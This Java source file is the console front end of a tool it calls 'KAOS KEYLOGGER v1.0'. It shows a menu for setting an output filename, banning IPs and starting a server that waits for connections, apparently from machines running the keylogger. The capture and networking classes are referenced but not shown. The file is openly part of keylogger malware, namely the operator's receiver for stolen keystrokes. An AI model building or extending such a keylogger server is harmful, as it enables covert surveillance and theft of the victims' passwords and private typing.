package org.example;

import org.example.Exceptions.FilenameException;

import java.util.ArrayList;
import java.util.Locale;
import java.util.Scanner;

public class Main {
    public static Scanner sc = new Scanner(System.in);
    public static TextWriter writer = null;
    public static Server server = new Server();
    private static ArrayList<String> bannedIps = new ArrayList<>();

    public static void main(String[] args) {
        printer();
        boolean exit = false;
        while (!exit){
            exit = menu();
        }
    }


    public static boolean menu(){
        boolean exit = false;
        System.out.println("KaosKLG> ");
        String op = sc.nextLine().toLowerCase();
        switch (op){
            case "start":
                System.out.println("LISTENING FOR CONNECTIONS...");
                if (writer!=null){
                    server.serverInit(bannedIps);
                    System.out.println("~$ " + server.getIp()  + " SUCCESSFULLY CONNECTED");
                    server.start();
                }else{
                    System.out.println("FIRST SET THE FILENAME!!!");
                }
                break;
            case "ban":
                System.out.println("--> ");
                String banIp = sc.nextLine();
                bannedIps.add(banIp);
                break;

            case "exit":
                server.close();
                exit = true;
                break;
            case "help":
                System.out.println(helper());
                break;

            case "set filename":
                System.out.println("--> ");
                try {
                    writer = TextWriter.TextWriterMaker(sc.next());
                } catch (FilenameException e) {
                    System.out.println(e.getMessage());
                }
                break;

            default:
                break;
        }
        return exit;
    }
    public static void printer(){
        System.out.println("\n" +
                "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n" +
                "$$$$$$$$$$$$$$$$$$$$$$$$_____$$$$\n" +
                "$$$$_____$$$$$$$$$$$$$$$_____$$$$\n" +
                "$$$$_____$$$$$$$$$$$$$$$_____$$$$\n" +
                "$$$$_____$$____$$$____$$_____$$$$\n" +
                "$$$$_____$______$______$_____$$$$\n" +
                "$$$$_____$______$______$_____$$$$\n" +
                "$$$$_____$____$$$$$$$$$$$$$$$$$$$\n" +
                "$$$$_____$___$$___________$$$$$$$\n" +
                "$$$$_____$__$$_______________$$$$\n" +
                "$$$$__________$$_____________$$$$\n" +
                "$$$$___________$$___________$$$$$\n" +
                "$$$$_____________$_________$$$$$$\n" +
                "$$$$$_____________________$$$$$$$\n" +
                "$$$$$$___________________$$$$$$$$\n" +
                "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n" +
                "              KAOS KEYLOGGER v1.0");
    }
    public static String helper(){
        return "COMMANDS\n" +
                "start (STARTS THE SERVER LISTENING)\n" +
                "ban (SETS A BANNED IP)\n" +
                "set filename (SETS THE FILENAME)\n" +
                "exit";
    }
}